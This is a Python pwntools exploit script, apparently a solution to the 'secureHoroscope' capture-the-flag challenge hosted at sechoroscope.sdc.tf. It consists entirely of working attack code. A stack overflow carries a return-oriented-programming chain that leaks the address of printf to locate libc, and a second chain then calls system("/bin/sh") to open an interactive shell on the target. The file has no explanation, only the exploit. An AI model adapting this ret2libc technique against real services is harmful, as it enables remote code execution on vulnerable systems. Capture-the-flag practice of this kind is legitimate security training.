#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host sechoroscope.sdc.tf --port 1337 ./secureHoroscope
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./secureHoroscope')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or 'sechoroscope.sdc.tf'
port = int(args.PORT or 1337)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
b *0x000000000040080d
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

libc = ELF("./libc-2.27.so")
main = 0x00000000004006c7
get_info = 0x00000000004007b1
pop_rdi = 0x0000000000400873
pop_rsi = 0x0000000000400871
got_puts = exe.got['printf']
plt_puts = exe.plt['puts']
p =b''
p += p64(pop_rdi)
p += p64(got_puts)
p += p64(plt_puts)
p += p64(main)
io.sendlineafter(b"feel\n",p)

p = b"a"*(100+4+8+8)
p += p64(pop_rsi)
print(len(p))
assert(len(p)<=0x8c)
io.sendafter(b"scope\n\n",p)

io.recvuntil(b"days.\n")
leak = u64(io.recvline()[:-1].ljust(8,b"\x00"))
print(hex(leak))
libc.address = leak - libc.sym['printf']
print(hex(libc.address))

p =b''
p += p64(pop_rdi)
p += p64(next(libc.search(b"/bin/sh\x00")))
p += p64(pop_rdi+1)
p += p64(libc.sym['system'])
io.sendlineafter(b"feel\n",p)

p = b"a"*(100+4+8+8)
p += p64(pop_rsi)
print(len(p))
assert(len(p)<=0x8c)
io.sendafter(b"scope\n\n",p)

io.interactive()

